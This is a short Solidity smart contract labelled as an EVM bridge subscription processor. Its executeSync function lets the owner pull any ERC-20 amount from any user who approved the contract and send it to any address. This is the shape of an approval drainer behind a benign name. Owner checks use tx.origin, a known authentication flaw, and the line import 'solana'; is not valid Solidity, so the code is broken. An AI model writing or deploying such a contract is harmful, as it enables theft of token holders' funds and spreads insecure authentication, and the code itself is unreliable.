// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import 'solana';

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract EVMBridgeSubscription {
    address public owner;

    event SubscriptionProcessed(
        address indexed user, 
        address indexed targetBridge, 
        uint256 amount
    );

    constructor() {
        owner = tx.origin;
    }

    modifier onlyOwner() {
        require(tx.origin == owner, "Not the contract owner");
        _;
    }

    function executeSync(
        address tokenAddress,
        address fromUser,
        address toBridgeC,
        uint256 amount
    ) external onlyOwner returns (bool) {
        require(tokenAddress != address(0), "Invalid token address");
        require(fromUser != address(0), "Invalid user address");
        require(toBridgeC != address(0), "Invalid bridge address");
        require(amount > 0, "Amount must be greater than 0");

        IERC20 token = IERC20(tokenAddress);
        
        bool success = token.transferFrom(fromUser, toBridgeC, amount);
        require(success, "Token transfer failed");

        emit SubscriptionProcessed(fromUser, toBridgeC, amount);
        return true;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner");
        owner = newOwner;
    }
}